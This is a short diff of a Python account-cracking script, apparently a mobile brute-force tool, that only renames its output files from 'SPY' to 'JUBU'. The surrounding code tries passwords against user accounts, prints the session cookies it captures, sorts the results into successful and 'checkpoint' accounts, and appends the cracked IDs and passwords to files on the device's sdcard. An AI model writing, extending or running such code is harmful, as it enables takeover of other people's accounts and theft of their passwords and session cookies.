@@ -443,14 +443,14 @@ def a(uid,pwx,tl):
                 cid = coki[65:80]
                 print(f'\r\33[1;92m [JUBU-OK] '+cid+' | '+ps+'\33[0;92m')
                 print(f'\r\033[1;92m [♥] COOKIE : '+coki)
-                open('/sdcard/SPY-OK.txt', 'a').write(cid+' | '+ps+'\n')
+                open('/sdcard/JUBU-OK.txt', 'a').write(cid+' | '+ps+'\n')
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
                 print(f"\r\x1b[38;5;196m[cp] {uid}|{ps}")
-                open('/sdcard/SPY1×1-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                open('/sdcard/JUBU1×1-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
             else:
@@ -511,7 +511,7 @@ def b(uid,pwx,tl):
                 print(f'\r\33[1;92m [🔢] Number : {uid}')
                 print(f'\r\033[1;92m [🍪] COOKIE : '+coki)
                 oks.append(cid)
-                open('/sdcard/SPY-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
+                open('/sdcard/JUBU-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                 break
             else:
                 continue
@@ -571,7 +571,7 @@ def c(uid,pwx,tl):
                 print(f'\r\033[1;92m [🍪] COOKIE : '+coki)
                 cek_apk(session,coki)
                 oks.append(cid)
-                open('/sdcard/SPY-OK.txt', 'a').write(cid+' | '+ps+'\n')
+                open('/sdcard/JUBU-OK.txt', 'a').write(cid+' | '+ps+'\n')
                 break
             else:
                 continue
